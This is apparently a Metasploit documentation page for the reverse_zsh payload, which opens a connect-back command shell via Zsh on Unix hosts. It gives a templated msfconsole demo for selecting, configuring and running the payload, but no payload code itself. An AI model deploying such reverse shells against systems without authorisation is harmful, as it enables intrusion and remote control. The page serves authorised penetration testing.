## Unix Command Shell, Reverse TCP (via Zsh)

Connect back and create a command shell via Zsh. Note: 
Although Zsh is often available, please be aware it isn't 
usually installed by default.


## Module Name
payload/cmd/unix/reverse_zsh

## Authors
Doug Prostko <dougtko[at]gmail.com>





## Platforms
unix

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/cmd/unix/reverse_zsh
msf payload(reverse_zsh) > show targets
   ... a list of targets ...
msf payload(reverse_zsh) > set TARGET <target-id>
msf payload(reverse_zsh) > show options
   ... show and set options ...
msf payload(reverse_zsh) > run
```
    
    